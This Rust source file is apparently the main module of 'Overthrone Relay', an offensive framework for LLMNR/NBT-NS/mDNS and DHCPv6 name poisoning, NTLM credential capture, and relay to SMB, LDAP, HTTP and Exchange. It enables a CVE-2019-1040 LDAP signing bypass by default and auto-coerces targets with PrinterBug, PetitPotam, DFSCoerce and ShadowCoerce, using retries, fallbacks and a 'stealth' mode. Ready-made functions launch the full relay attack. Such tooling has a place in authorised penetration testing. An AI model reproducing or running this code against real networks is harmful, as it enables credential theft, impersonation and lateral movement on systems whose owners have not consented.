//! Overthrone Relay -- NTLM Relay and Responder Framework
//!
//! Implements LLMNR/NBT-NS poisoning and NTLM relay attacks
//! for credential capture and relay to other services.

pub mod adcs_relay;
pub mod captive_portal;
pub mod exchange;
pub mod http_asymmetric;
pub mod http_relay;
pub mod mitm6;
pub mod poisoner;
pub mod relay;
pub mod responder;
pub mod smb_daemon;
pub mod tls;
pub mod tls_relay;
pub mod utils;
pub mod wpad;

// Re-export types from submodules
pub use adcs_relay::{AdcsRelay, AdcsRelayConfig};
pub use captive_portal::{
    CaptivePortal, CaptivePortalConfig, CaptivePortalTemplate, CapturedFormCredential,
};
pub use http_asymmetric::{HttpAsymmetricConfig, HttpAsymmetricRelay};
pub use http_relay::{HttpRelay, HttpRelayConfig};
pub use relay::RelayStats;
pub use responder::CapturedCredential;
pub use smb_daemon::{SmbDaemon, SmbDaemonConfig, SmbDaemonMode};
pub use tls_relay::{CbtMode, TlsRelay, TlsRelayConfig};
pub use wpad::{WpadConfig, WpadServer};
// Re-export RelayError from overthrone_core
use futures::stream::{FuturesUnordered, StreamExt};
pub use overthrone_core::error::RelayError;
use overthrone_core::error::Result;
use overthrone_core::proto::coerce::{CoerceCreds, CoerceProtocol};
use overthrone_core::proto::{
    trigger_coerce_tcp, trigger_dfs_coerce, trigger_dfs_coerce_ex, trigger_petitpotam,
    trigger_petitpotam_ex, trigger_printer_bug, trigger_printer_bug_ex,
};
use std::net::{SocketAddr, TcpStream};
use std::sync::Arc;
use std::time::{Duration, Instant};
use tokio::sync::Mutex as TokioMutex;
use tokio::time::sleep;
use tracing::{debug, info, warn};

/// Protocol for relay targets
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Protocol {
    /// `Smb` variant
    Smb,
    /// `Http` variant
    Http,
    /// `Https` variant
    Https,
    /// `Ldap` variant
    Ldap,
    /// `Ldaps` variant
    Ldaps,
    /// `Mssql` variant
    Mssql,
    /// `Webdav` variant (HTTP-based, used by ShadowCoerce)
    Webdav,
    /// `Msmq` variant (Microsoft Message Queuing, port 1801)
    Msmq,
    /// `Exchange` variant (MAPI-over-HTTP / EWS, CVE-2024-21410)
    Exchange,
}

impl std::fmt::Display for Protocol {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::Smb => write!(f, "SMB"),
            Self::Http => write!(f, "HTTP"),
            Self::Https => write!(f, "HTTPS"),
            Self::Ldap => write!(f, "LDAP"),
            Self::Ldaps => write!(f, "LDAPS"),
            Self::Mssql => write!(f, "MSSQL"),
            Self::Webdav => write!(f, "WebDAV"),
            Self::Msmq => write!(f, "MSMQ"),
            Self::Exchange => write!(f, "Exchange"),
        }
    }
}

/// Attack mode for responder/relay
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum AttackMode {
    /// `Capture` variant
    Capture,
    /// `Relay` variant
    Relay,
    /// `SmbRelay` variant
    SmbRelay,
    /// `HttpRelay` variant
    HttpRelay,
}

/// NTLM challenge structure
#[derive(Debug, Clone)]
pub struct NtlmChallenge {
    /// Raw byte data
    pub data: Vec<u8>,
    /// Target server name
    pub target_name: String,
}

/// NTLM response structure
#[derive(Debug, Clone)]
pub struct NtlmResponse {
    /// Username for authentication
    pub username: String,
    /// Domain FQDN
    pub domain: String,
    /// LM response data
    pub lm_response: Vec<u8>,
    /// NT response data
    pub nt_response: Vec<u8>,
}

/// Relay target specification
#[derive(Debug, Clone)]
pub struct RelayTarget {
    /// Network address (IP:port)
    pub address: SocketAddr,
    /// Network protocol variant
    pub protocol: Protocol,
    /// Username for authentication
    pub username: Option<String>,
}

/// Controller state
#[derive(Debug, Clone, PartialEq, Eq, Default)]
pub enum ControllerState {
    /// Controller has not been initialized
    #[default]
    Initial,
    /// Controller is running
    Running,
    /// Controller is stopped
    Stopped,
    /// Controller encountered an error
    Error(String),
}

/// Main relay controller that coordinates poisoner and relay components.
///
/// The relay is wrapped in `Arc<TokioMutex<>>` so it can be shared with the
/// responder's HTTP server for asymmetric relay (e.g., HTTP -> SMB).
pub struct RelayController {
    config: RelayControllerConfig,
    _state: ControllerState,
    poisoner: Option<poisoner::Poisoner>,
    mitm6: Option<mitm6::Mitm6>,
    responder: Option<responder::Responder>,
    relay: Option<Arc<TokioMutex<relay::NtlmRelay>>>,
    http_relay: Option<http_relay::HttpRelay>,
    tls_relay: Option<tls_relay::TlsRelay>,
}

#[derive(Debug, Clone)]
/// Data structure used by this module.
pub struct RelayControllerConfig {
    /// Interface to listen on (e.g., "eth0", "0.0.0.0")
    pub interface: String,
    /// Enable LLMNR poisoning
    pub llmnr: bool,
    /// Enable NBT-NS poisoning
    pub nbtns: bool,
    /// Enable mDNS poisoning
    pub mdns: bool,
    /// Enable DHCPv6 DNS poisoning (mitm6)
    pub mitm6: bool,
    /// Enable responder for credential capture
    pub responder: bool,
    /// Enable relay to targets
    pub relay_targets: Vec<RelayTarget>,
    /// Challenge to use for NTLM authentication (hex string)
    pub challenge: Option<String>,
    /// WPAD proxy script to serve
    pub wpad_script: Option<String>,
    /// Force authentication downgrade
    pub downgrade_auth: bool,
    /// If `true`, skip all poisoning/responder components.
    /// Useful when pre-captured hashes are fed externally -- relay only mode.
    pub no_poison: bool,
    /// Enable LDAP signing bypass (CVE-2019-1040).
    /// Strips SIGN/SEAL/ALWAYS_SIGN flags and channel bindings from
    /// NTLM challenge/authenticate during LDAP/LDAPS relay.
    pub ldap_signing_bypass: bool,
    /// Shared TLS configuration (verification mode + optional mTLS identity).
    /// Default: `None` means `TlsConfig::relay_default()` (AcceptAll mode, no client cert).
    /// Set to `Some(TlsConfig::verify_server(...))` to validate server certificates.
    pub tls_config: Option<tls::TlsConfig>,
    /// Optional SOCKS5 proxy for outbound relay connections (format: `host:port`).
    /// When set, all outbound NTLM relay connections route through this SOCKS5 proxy
    /// instead of connecting directly. Useful for pivoting through a compromised host.
    pub socks5_proxy: Option<String>,
    /// Hosts to automatically coerce into authenticating to this relay.
    /// Each host will be targeted with printer-bug, petitpotam, and DFS coercion.
    pub auto_coerce_targets: Vec<String>,
    /// IP address that coerced targets should connect back to.
    /// Typically the relay's own IP on the target network.
    /// Required when `auto_coerce_targets` is non-empty.
    pub auto_coerce_listener: Option<String>,
    /// Configuration for standalone HTTP asymmetric relay listener.
    /// When set, starts an HTTP listener that relays captured NTLM tokens
    /// to the configured target protocols (SMB, LDAP, etc.).
    /// Independent of the responder/poisoner -- useful when coerced auth
    /// lands directly on HTTP and needs to pivot to SMB.
    pub http_relay_config: Option<HttpRelayConfig>,
    /// Configuration for TLS-wrapped relay listener.
    /// When set, starts a TLS listener (typically on port 443 for HTTPS relay)
    /// with optional mTLS client certificate verification.
    /// After TLS termination, NTLM tokens are extracted from HTTP requests
    /// and relayed to the configured targets.
    /// Useful for legitimate proxy/auditing deployments or when the relay
    /// must accept connections over encrypted channels.
    pub tls_relay_config: Option<TlsRelayConfig>,
    /// Enable automatic coercion technique cycling.
    /// When true, tries all available coercion techniques in parallel against each target
    /// instead of sequentially. Faster but noisier.
    pub auto_coerce_parallel: bool,
    /// Coercion technique preference: "all", "stealth" (printer-bug only), "aggressive" (all + retry)
    pub auto_coerce_mode: String,
    /// Maximum retries per technique when auto_coerce_mode is "aggressive"
    pub auto_coerce_max_retries: u32,
    /// Optional credentials for coercion triggers.
    /// When `None`, uses SMB null session fallback.
    /// When `Some`, uses these credentials for authenticated SMB binds.
    pub auto_coerce_credentials: Option<CoerceCreds>,
    /// Passive analysis mode -- log LLMNR/NBT-NS/mDNS queries without poisoning
    pub analyze_only: bool,
    /// IP address to use in poisoned responses (defaults to interface IP when None)
    pub poison_ip: Option<String>,
    /// Configuration for standalone WPAD proxy server (None = disabled)
    pub wpad_config: Option<WpadConfig>,
}

impl Default for RelayControllerConfig {
    fn default() -> Self {
        Self {
            interface: "::".to_string(),
            llmnr: true,
            nbtns: true,
            mdns: false,
            mitm6: false,
            responder: true,
            relay_targets: Vec::new(),
            challenge: None,
            wpad_script: None,
            downgrade_auth: false,
            no_poison: false,
            ldap_signing_bypass: true,
            tls_config: None,
            socks5_proxy: None,
            auto_coerce_targets: Vec::new(),
            auto_coerce_listener: None,
            http_relay_config: None,
            auto_coerce_parallel: false,
            auto_coerce_mode: "all".to_string(),
            auto_coerce_max_retries: 1,
            auto_coerce_credentials: None,
            tls_relay_config: None,
            analyze_only: false,
            poison_ip: None,
            wpad_config: None,
        }
    }
}

impl RelayController {
    /// Create a new relay controller with the given configuration
    pub fn new(config: RelayControllerConfig) -> Self {
        Self {
            config,
            _state: ControllerState::Initial,
            poisoner: None,
            mitm6: None,
            responder: None,
            relay: None,
            http_relay: None,
            tls_relay: None,
        }
    }

    /// Initialize all components based on configuration
    pub async fn initialize(&mut self) -> Result<()> {
        info!(
            "Initializing relay controller on interface: {}",
            self.config.interface
        );

        // Initialize poisoner if enabled (skipped in no-poison / relay-only mode)
        if !self.config.no_poison && (self.config.llmnr || self.config.nbtns || self.config.mdns) {
            let poison_ip = self
                .config
                .poison_ip
                .clone()
                .unwrap_or_else(|| self.config.interface.clone());
            let poisoner_config = poisoner::PoisonerConfig {
                listen_ip: self.config.interface.clone(),
                poison_ip,
                attack_mode: AttackMode::Capture,
                timeout: 30,
                llmnr: self.config.llmnr,
                nbtns: self.config.nbtns,
                mdns: self.config.mdns,
                analyze_only: self.config.analyze_only,
                target_hosts: Vec::new(),
            };
            self.poisoner = Some(poisoner::Poisoner::new(poisoner_config)?);
            info!("Poisoner initialized");
        }

        // Initialize mitm6 if enabled
        if !self.config.no_poison && self.config.mitm6 {
            let mitm6_config = mitm6::Mitm6Config {
                listen_ip: "::".to_string(),
                ..mitm6::Mitm6Config::default()
            };
            self.mitm6 = Some(mitm6::Mitm6::new(mitm6_config));
            info!("mitm6 initialized");
        }

        // Initialize responder if enabled (skipped in no-poison / relay-only mode)
        if !self.config.no_poison && self.config.responder {
            let responder_config = responder::ResponderConfig {
                listen_ip: self.config.interface.clone(),
                challenge: self.config.challenge.clone(),
                http: true,
                smb: true,
                ldap: true,
                msmq: false,
            };
            self.responder = Some(responder::Responder::new(responder_config));
            info!("Responder initialized for credential capture");
        }

        // Initialize standalone WPAD proxy server if configured
        if let Some(ref wpad_cfg) = self.config.wpad_config {
            let wpad = wpad::WpadServer::new(wpad_cfg.clone());
            match wpad.start().await {
                Ok(_) => info!("WPAD proxy server started"),
                Err(e) => warn!("WPAD proxy server failed to start: {}", e),
            }
            info!("WPAD proxy configured");
        }

        // Initialize relay if targets specified
        if !self.config.relay_targets.is_empty() {
            let relay_config = relay::RelayConfig {
                listen_ip: self.config.interface.clone(),
                targets: self.config.relay_targets.clone(),
                round_robin: true,
                remove_on_success: true,
                timeout_secs: 30,
                ldap_signing_bypass: self.config.ldap_signing_bypass,
                max_retries: 3,
                max_connections: 64,
                tls_config: self.config.tls_config.clone(),
                socks5_proxy: self.config.socks5_proxy.clone(),
            };
            let ntlm_relay = relay::NtlmRelay::new(relay_config);
            let relay_arc = Arc::new(TokioMutex::new(ntlm_relay));

            // Wire the responder bridge for asymmetric relay (e.g., HTTP -> SMB).
            // The responder's HTTP server will forward NTLM tokens through the
            // relay engine, enabling cross-protocol relay from any responder
            // listener to any target protocol.
            if let Some(ref mut responder) = self.responder {
                responder.set_relay(relay_arc.clone(), tokio::runtime::Handle::current());
                info!("Responder bridge wired for asymmetric relay");
            }

            info!(
                "NTLM relay initialized with {} target(s)",
                self.config.relay_targets.len()
            );
            self.relay = Some(relay_arc);
        }

        // Initialize standalone HTTP relay if configured
        if let Some(ref http_config) = self.config.http_relay_config {
            let http_relay = http_relay::HttpRelay::new(http_config.clone());
            info!(
                "HTTP asymmetric relay initialized with {} target(s)",
                http_config.targets.len()
            );
            self.http_relay = Some(http_relay);
        }

        // Initialize TLS relay if configured
        if let Some(ref tls_config) = self.config.tls_relay_config {
            let tls_relay = tls_relay::TlsRelay::new(tls_config.clone());
            info!(
                "TLS relay initialized with {} target(s)",
                tls_config.targets.len()
            );
            self.tls_relay = Some(tls_relay);
        }

        Ok(())
    }

    /// Start all enabled services
    pub async fn start(&mut self) -> Result<()> {
        info!("Starting relay controller services...");

        if let Some(ref mut poisoner) = self.poisoner {
            poisoner.start().await?;
            info!("Poisoner started");
        }

        if let Some(ref mut mitm6) = self.mitm6 {
            mitm6.start().await?;
            info!("mitm6 started");
        }

        if let Some(ref mut responder) = self.responder {
            responder.start().await?;
            info!("Responder started");
        }

        if let Some(ref relay) = self.relay {
            let mut guard = relay.lock().await;
            guard.start().await?;
            info!("NTLM relay started");
        }

        if let Some(ref mut http_relay) = self.http_relay {
            http_relay.start().await?;
            info!("HTTP asymmetric relay started");
        }

        if let Some(ref mut tls_relay) = self.tls_relay {
            tls_relay.start().await?;
            info!("TLS relay started");
        }

        info!("All services started successfully");

        // Auto-trigger coercion against specified targets
        if !self.config.auto_coerce_targets.is_empty() {
            self.auto_coerce().await;
        }

        Ok(())
    }

    /// Automatically trigger coercion against configured targets.
    /// Respects `auto_coerce_mode`, `auto_coerce_parallel`, and `auto_coerce_max_retries`.
    /// Supports PrinterBug (stealth), PetitPotam, DFSCoerce, and ShadowCoerce via WebDAV.
    /// Waits for listener readiness before firing, and uses configured credentials if available.
    async fn auto_coerce(&self) {
        let listener = match &self.config.auto_coerce_listener {
            Some(ip) => ip.clone(),
            None => {
                warn!(
                    "auto_coerce_targets is set but no auto_coerce_listener -- skipping coercion"
                );
                return;
            }
        };

        let port = match &self.config.http_relay_config {
            Some(http) => http.listen_port,
            None => 445,
        };

        // Wait for listeners to be ready before firing
        wait_for_listener_ready(port, Duration::from_secs(10)).await;
        if self.config.http_relay_config.is_some() {
            wait_for_listener_ready(port, Duration::from_secs(10)).await;
        }

        // Determine techniques based on mode
        let technique_names: Vec<&str> = match self.config.auto_coerce_mode.as_str() {
            "stealth" => vec!["printer-bug"],
            _ => vec!["printer-bug", "petitpotam", "dfs-coerce"],
        };

        // Build SMB and WebDAV listener paths
        let smb_listener = format!(r"\\{}\coerce", listener);
        let webdav_listener = format!(r"\\{}@{}\webdav\coerce.txt", listener, port);

        let max_retries = if self.config.auto_coerce_mode == "aggressive" {
            self.config.auto_coerce_max_retries.max(1)
        } else {
            1
        };

        let has_http = self.config.http_relay_config.is_some();
        let creds = self.config.auto_coerce_credentials.clone();

        info!(
            "Auto-coercing {} target(s) | mode={} | parallel={} | max_retries={} | creds={}",
            self.config.auto_coerce_targets.len(),
            self.config.auto_coerce_mode,
            self.config.auto_coerce_parallel,
            max_retries,
            creds.is_some(),
        );

        if self.config.auto_coerce_parallel {
            let mut tasks: FuturesUnordered<_> = self
                .config
                .auto_coerce_targets
                .iter()
                .map(|target| {
                    let t = target.clone();
                    let l = listener.clone();
                    let smb = smb_listener.clone();
                    let webdav = webdav_listener.clone();
                    let tn = technique_names.clone();
                    let c = creds.clone();
                    async move {
                        coerce_target_ex(&t, &l, &smb, &webdav, &tn, max_retries, has_http, c).await
                    }
                })
                .collect();
            while let Some(result) = tasks.next().await {
                info!("{}", result);
            }
        } else {
            for target in &self.config.auto_coerce_targets {
                let result = coerce_target_ex(
                    target,
                    &listener,
                    &smb_listener,
                    &webdav_listener,
                    &technique_names,
                    max_retries,
                    has_http,
                    creds.clone(),
                )
                .await;
                info!("{}", result);
            }
        }
    }

    /// Stop all services
    pub async fn stop(&mut self) -> Result<()> {
        info!("Stopping relay controller services...");

        if let Some(ref mut poisoner) = self.poisoner {
            poisoner.stop().await?;
        }

        if let Some(ref mut mitm6) = self.mitm6 {
            mitm6.stop().await;
        }

        if let Some(ref mut responder) = self.responder {
            responder.stop().await?;
        }

        if let Some(ref relay) = self.relay {
            let mut guard = relay.lock().await;
            guard.stop().await?;
        }

        if let Some(ref mut http_relay) = self.http_relay {
            http_relay.stop().await?;
        }

        if let Some(ref mut tls_relay) = self.tls_relay {
            tls_relay.stop().await;
        }

        info!("All services stopped");
        Ok(())
    }

    /// Get captured credentials from responder
    pub fn get_captured_credentials(&self) -> Vec<CapturedCredential> {
        if let Some(ref responder) = self.responder {
            responder.get_captured_credentials()
        } else {
            Vec::new()
        }
    }

    /// Get relay statistics
    pub fn get_relay_stats(&self) -> RelayStats {
        if let Some(ref relay) = self.relay {
            relay
                .try_lock()
                .map(|guard| guard.get_stats())
                .unwrap_or_default()
        } else {
            RelayStats::default()
        }
    }
}

/// Coerce a single target using the specified techniques with retry, TCP fallback, and WebDAV fallback.
/// Uses optional credentials when provided (otherwise SMB null session).
#[allow(clippy::too_many_arguments)]
async fn coerce_target_ex(
    target: &str,
    listener_ip: &str,
    smb_listener: &str,
    webdav_listener: &str,
    techniques: &[&str],
    max_retries: u32,
    has_http_relay: bool,
    creds: Option<CoerceCreds>,
) -> String {
    let mut summary = String::new();
    let creds_ref = creds.as_ref();
    for &technique in techniques {
        let (pipe_listener, desc) = match technique {
            "printer-bug" => (smb_listener, "PrinterBug"),
            "petitpotam" => (smb_listener, "PetitPotam"),
            "dfs-coerce" => (smb_listener, "DFSCoerce"),
            _ => continue,
        };

        let attempts = if max_retries > 1 { max_retries } else { 1 };
        for attempt in 1..=attempts {
            let result = match technique {
                "printer-bug" => match creds_ref {
                    Some(c) => trigger_printer_bug_ex(target, pipe_listener, Some(c)).await,
                    None => trigger_printer_bug(target, pipe_listener).await,
                },
                "petitpotam" => match creds_ref {
                    Some(c) => trigger_petitpotam_ex(target, pipe_listener, Some(c)).await,
                    None => trigger_petitpotam(target, pipe_listener).await,
                },
                "dfs-coerce" => match creds_ref {
                    Some(c) => trigger_dfs_coerce_ex(target, pipe_listener, Some(c)).await,
                    None => trigger_dfs_coerce(target, pipe_listener).await,
                },
                _ => continue,
            };
            match result {
                Ok(r) if r.success => {
                    summary.push_str(&format!("[{target}] {desc} OK. "));
                    break;
                }
                Ok(r) => {
                    let tag = if attempt < attempts {
                        let delay = Duration::from_secs(2u64.saturating_pow(attempt));
                        sleep(delay).await;
                        format!("retry {attempt}/{attempts}")
                    } else {
                        "exhausted".into()
                    };
                    warn!("[{target}] {desc} failed: {} ({tag})", r.message);
                }
                Err(e) => {
                    let tag = if attempt < attempts {
                        let delay = Duration::from_secs(2u64.saturating_pow(attempt));
                        sleep(delay).await;
                        format!("retry {attempt}/{attempts}")
                    } else {
                        "exhausted".into()
                    };
                    warn!("[{target}] {desc} error: {e} ({tag})");
                }
            }
        }
    }
    // TCP fallback: if all named pipe techniques failed, try TCP-based coercion
    // via EPM (port 135) resolution -- works when SMB port 445 is filtered
    if !summary.contains("OK") {
        let tcp_protocols: &[(CoerceProtocol, &str)] = &[
            (CoerceProtocol::Rprn, "PrinterBug-TCP"),
            (CoerceProtocol::EfsRpc, "PetitPotam-TCP"),
            (CoerceProtocol::EfsBackup, "DFSCoerce-TCP"),
        ];
        for &(protocol, desc) in tcp_protocols {
            match trigger_coerce_tcp(target, listener_ip, protocol).await {
                Ok(r) if r.success => {
                    summary.push_str(&format!("[{target}] {desc} OK. "));
                    break;
                }
                Ok(r) => warn!("[{target}] {desc} failed: {}", r.message),
                Err(e) => warn!("[{target}] {desc} error: {e}"),
            }
        }
    }
    // WebDAV fallback via PrinterBug when HTTP relay is active
    if has_http_relay {
        match trigger_printer_bug(target, webdav_listener).await {
            Ok(r) if r.success => summary.push_str(&format!("[{target}] WebDAV/PrinterBug OK. ")),
            Ok(r) => warn!("[{target}] WebDAV/PrinterBug failed: {}", r.message),
            Err(e) => warn!("[{target}] WebDAV/PrinterBug error: {e}"),
        }
        // ShadowCoerce: PetitPotam over WebDAV trick
        match trigger_petitpotam(target, webdav_listener).await {
            Ok(r) if r.success => {
                summary.push_str(&format!("[{target}] ShadowCoerce/PetitPotam-WebDAV OK. "))
            }
            Ok(r) => debug!(
                "[{target}] ShadowCoerce/PetitPotam-WebDAV failed: {}",
                r.message
            ),
            Err(e) => debug!("[{target}] ShadowCoerce/PetitPotam-WebDAV error: {e}"),
        }
    }
    if summary.is_empty() {
        summary = format!("[{target}] all techniques failed");
    }
    summary
}

/// Wait until a TCP port is accepting connections (listener readiness check).
/// Retries with backoff up to `timeout` duration.
async fn wait_for_listener_ready(port: u16, timeout: Duration) {
    let start = Instant::now();
    let mut delay = Duration::from_millis(100);
    while start.elapsed() < timeout {
        match TcpStream::connect_timeout(
            &format!("127.0.0.1:{port}")
                .parse()
                .expect("127.0.0.1:{u16} is always a valid SocketAddr"),
            Duration::from_millis(200),
        ) {
            Ok(_) => {
                debug!("Listener ready on port {port}");
                return;
            }
            Err(_) => {
                sleep(delay).await;
                delay = (delay * 2).min(Duration::from_secs(1));
            }
        }
    }
    warn!("Listener on port {port} not ready after {timeout:?}, proceeding anyway");
}

/// Quick start function for common use case (poison + capture)
pub async fn run_responder(interface: &str, challenge: Option<&str>) -> Result<RelayController> {
    let config = RelayControllerConfig {
        interface: interface.to_string(),
        llmnr: true,
        nbtns: true,
        mdns: false,
        mitm6: false,
        responder: true,
        relay_targets: Vec::new(),
        challenge: challenge.map(|s| s.to_string()),
        wpad_script: None,
        downgrade_auth: false,
        no_poison: false,
        ldap_signing_bypass: true,
        tls_config: None,
        socks5_proxy: None,
        auto_coerce_targets: Vec::new(),
        auto_coerce_listener: None,
        http_relay_config: None,
        auto_coerce_parallel: false,
        auto_coerce_mode: "all".to_string(),
        auto_coerce_max_retries: 1,
        auto_coerce_credentials: None,
        tls_relay_config: None,
        analyze_only: false,
        poison_ip: None,
        wpad_config: None,
    };

    let mut controller = RelayController::new(config);
    controller.initialize().await?;
    controller.start().await?;

    Ok(controller)
}

/// Run full relay attack (poison + capture + relay)
pub async fn run_relay_attack(
    interface: &str,
    targets: Vec<RelayTarget>,
    challenge: Option<&str>,
) -> Result<RelayController> {
    let config = RelayControllerConfig {
        interface: interface.to_string(),
        llmnr: true,
        nbtns: true,
        mdns: false,
        mitm6: false,
        responder: true,
        relay_targets: targets,
        challenge: challenge.map(|s| s.to_string()),
        wpad_script: None,
        downgrade_auth: false,
        no_poison: false,
        ldap_signing_bypass: true,
        tls_config: None,
        socks5_proxy: None,
        auto_coerce_targets: Vec::new(),
        auto_coerce_listener: None,
        http_relay_config: None,
        auto_coerce_parallel: false,
        auto_coerce_mode: "all".to_string(),
        auto_coerce_max_retries: 1,
        auto_coerce_credentials: None,
        tls_relay_config: None,
        analyze_only: false,
        poison_ip: None,
        wpad_config: None,
    };

    let mut controller = RelayController::new(config);
    controller.initialize().await?;
    controller.start().await?;

    Ok(controller)
}

pub async fn run_http_asymmetric_relay(
    interface: &str,
    listen_port: u16,
    targets: Vec<RelayTarget>,
    socks5_proxy: Option<String>,
) -> Result<RelayController> {
    let config = RelayControllerConfig {
        interface: interface.to_string(),
        llmnr: false,
        nbtns: false,
        mdns: false,
        mitm6: false,
        responder: false,
        relay_targets: Vec::new(),
        challenge: None,
        wpad_script: None,
        downgrade_auth: false,
        no_poison: true,
        ldap_signing_bypass: true,
        tls_config: None,
        socks5_proxy: socks5_proxy.clone(),
        auto_coerce_targets: Vec::new(),
        auto_coerce_listener: None,
        http_relay_config: Some(HttpRelayConfig {
            listen_ip: interface.to_string(),
            listen_port,
            targets,
            socks5_proxy,
            ldap_signing_bypass: true,
            max_retries: 3,
            timeout_secs: 30,
        }),
        auto_coerce_parallel: false,
        auto_coerce_mode: "all".to_string(),
        auto_coerce_max_retries: 1,
        auto_coerce_credentials: None,
        tls_relay_config: None,
        analyze_only: false,
        poison_ip: None,
        wpad_config: None,
    };

    let mut controller = RelayController::new(config);
    controller.initialize().await?;
    controller.start().await?;

    Ok(controller)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_relay_controller_config_default() {
        let config = RelayControllerConfig::default();
        assert_eq!(config.interface, "::");
        assert!(config.llmnr);
        assert!(config.nbtns);
        assert!(!config.mdns);
        assert!(config.responder);
        assert!(config.relay_targets.is_empty());
    }

    #[test]
    fn test_relay_stats_default() {
        let stats = RelayStats::default();
        assert_eq!(
            stats
                .successful_relays
                .load(std::sync::atomic::Ordering::Relaxed),
            0
        );
        assert_eq!(
            stats
                .failed_relays
                .load(std::sync::atomic::Ordering::Relaxed),
            0
        );
        assert_eq!(
            stats
                .active_connections
                .load(std::sync::atomic::Ordering::Relaxed),
            0
        );
        assert_eq!(
            stats
                .total_attempts
                .load(std::sync::atomic::Ordering::Relaxed),
            0
        );
    }

    #[test]
    fn test_protocol_display() {
        assert_eq!(Protocol::Smb.to_string(), "SMB");
        assert_eq!(Protocol::Http.to_string(), "HTTP");
        assert_eq!(Protocol::Https.to_string(), "HTTPS");
        assert_eq!(Protocol::Ldap.to_string(), "LDAP");
        assert_eq!(Protocol::Ldaps.to_string(), "LDAPS");
        assert_eq!(Protocol::Mssql.to_string(), "MSSQL");
        assert_eq!(Protocol::Webdav.to_string(), "WebDAV");
    }

    #[test]
    fn test_auto_coerce_config_defaults() {
        let config = RelayControllerConfig::default();
        assert!(config.auto_coerce_targets.is_empty());
        assert!(config.auto_coerce_listener.is_none());
        assert!(!config.auto_coerce_parallel);
        assert_eq!(config.auto_coerce_mode, "all");
        assert_eq!(config.auto_coerce_max_retries, 1);
    }

    #[test]
    fn test_tls_relay_config_default_is_none() {
        let config = RelayControllerConfig::default();
        assert!(config.tls_relay_config.is_none());
    }

    #[test]
    fn test_tls_relay_config_custom() {
        let config = RelayControllerConfig {
            tls_relay_config: Some(tls_relay::TlsRelayConfig {
                listen_ip: "0.0.0.0".to_string(),
                listen_port: 8443,
                tls_cert_path: "/tmp/cert.pem".to_string(),
                tls_key_path: "/tmp/key.pem".to_string(),
                mtls_client_ca_path: None,
                targets: vec![RelayTarget {
                    address: "10.0.0.1:445".parse().unwrap(),
                    protocol: Protocol::Smb,
                    username: None,
                }],
                socks5_proxy: None,
                ldap_signing_bypass: true,
                max_retries: 3,
                timeout_secs: 30,
                cbt_mode: tls_relay::CbtMode::Strip,
            }),
            ..RelayControllerConfig::default()
        };
        assert!(config.tls_relay_config.is_some());
        let tls_cfg = config.tls_relay_config.unwrap();
        assert_eq!(tls_cfg.listen_port, 8443);
        assert_eq!(tls_cfg.targets.len(), 1);
        assert_eq!(tls_cfg.cbt_mode, tls_relay::CbtMode::Strip);
    }

    #[test]
    fn test_auto_coerce_config_stealth_mode() {
        let config = RelayControllerConfig {
            auto_coerce_mode: "stealth".to_string(),
            auto_coerce_max_retries: 3,
            ..RelayControllerConfig::default()
        };
        assert_eq!(config.auto_coerce_mode, "stealth");
        assert_eq!(config.auto_coerce_max_retries, 3);
    }

    #[test]
    fn test_auto_coerce_config_aggressive_mode() {
        let config = RelayControllerConfig {
            auto_coerce_mode: "aggressive".to_string(),
            auto_coerce_max_retries: 5,
            auto_coerce_parallel: true,
            auto_coerce_targets: vec!["10.0.0.1".to_string(), "10.0.0.2".to_string()],
            auto_coerce_listener: Some("10.0.0.100".to_string()),
            ..RelayControllerConfig::default()
        };
        assert_eq!(config.auto_coerce_mode, "aggressive");
        assert_eq!(config.auto_coerce_max_retries, 5);
        assert!(config.auto_coerce_parallel);
        assert_eq!(config.auto_coerce_targets.len(), 2);
        assert_eq!(config.auto_coerce_listener, Some("10.0.0.100".to_string()));
    }

    #[test]
    fn test_auto_coerce_listener_paths() {
        let listener = "10.0.0.100";
        let smb_path = format!(r"\\{}\coerce", listener);
        let webdav_path = format!(r"\\{}@{}\webdav\coerce.txt", listener, 80);
        assert_eq!(smb_path, r"\\10.0.0.100\coerce");
        assert_eq!(webdav_path, r"\\10.0.0.100@80\webdav\coerce.txt");
    }

    #[test]
    fn test_auto_coerce_config_defaults_preserved_in_run_http_asymmetric() {
        // Verify that run_http_asymmetric_relay preserves auto_coerce defaults
        let config = RelayControllerConfig {
            interface: "0.0.0.0".to_string(),
            llmnr: false,
            nbtns: false,
            mdns: false,
            mitm6: false,
            responder: false,
            relay_targets: Vec::new(),
            challenge: None,
            wpad_script: None,
            downgrade_auth: false,
            no_poison: true,
            ldap_signing_bypass: true,
            tls_config: None,
            socks5_proxy: None,
            auto_coerce_targets: Vec::new(),
            auto_coerce_listener: None,
            http_relay_config: None,
            auto_coerce_parallel: false,
            auto_coerce_mode: "all".to_string(),
            auto_coerce_max_retries: 1,
            auto_coerce_credentials: None,
            tls_relay_config: None,
            analyze_only: false,
            poison_ip: None,
            wpad_config: None,
        };
        assert_eq!(config.auto_coerce_mode, "all");
        assert!(!config.auto_coerce_parallel);
        assert_eq!(config.auto_coerce_max_retries, 1);
    }
}
